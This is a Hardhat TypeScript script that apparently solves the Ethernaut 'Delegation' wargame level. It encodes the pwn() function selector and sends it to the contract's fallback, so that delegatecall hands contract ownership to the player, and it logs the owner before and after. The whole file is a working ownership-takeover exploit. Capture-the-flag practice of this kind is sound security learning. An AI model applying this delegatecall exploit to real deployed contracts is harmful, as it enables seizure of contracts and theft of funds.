import { ethers } from "hardhat";
import { TransactionRequest } from "@ethersproject/providers";
import { BigNumber } from "ethers";

const PLAYER_ADDRESS = "0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc";
const CONTRACT_ADDRESS = "0x80E2E2367C5E9D070Ae2d6d50bF0cdF6360a7151";

async function main() {
const signer = await ethers.getSigner(PLAYER_ADDRESS);

//Fit contract name and address (current lvl instance)
const contract = await ethers.getContractAt("Delegation",CONTRACT_ADDRESS,signer);


// 1. Check owner.
console.log("Contract owner is: ", await contract.owner())

// 2. Create the function signature of pwn() (encode data), which is going to be sent via transaction 
// to delegatecall parameter.
let ABI = ["function pwn()"];
let iface = new ethers.utils.Interface(ABI);
let calldata = iface.encodeFunctionData("pwn", []);
// calldata = ethers.utils.keccak256(ethers.utils.toUtf8Bytes("pwn()"))
console.log("Function signature is: ", calldata);

// 3. Create transaction to get to fallback function in Delegation contract, 
// call pwn() function via delegatecall, with the function signature as msg.data, 
// and update the state variable owner in our Delegation contract.
// IMPORTANT: gasLimit has to be set to have enough gas to call the delegated function 
// in Delegate contract.

const tx : TransactionRequest = {
    to: CONTRACT_ADDRESS,
    data: calldata,
    gasLimit: BigNumber.from('100000')
}

await signer.sendTransaction(tx);

//4. Check owner again
console.log("After tx, now owner is: ", await contract.owner())

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
